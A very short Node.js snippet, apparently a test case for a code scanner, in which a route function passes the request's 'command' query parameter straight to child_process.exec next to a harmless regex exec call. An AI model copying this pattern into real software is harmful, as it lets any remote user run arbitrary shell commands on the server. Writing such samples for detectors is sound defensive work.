const { exec } = require('node:child_process');

function route(req) {
  const match = /^x/.exec(req.query.x); exec(req.query.command);
  return match;
}
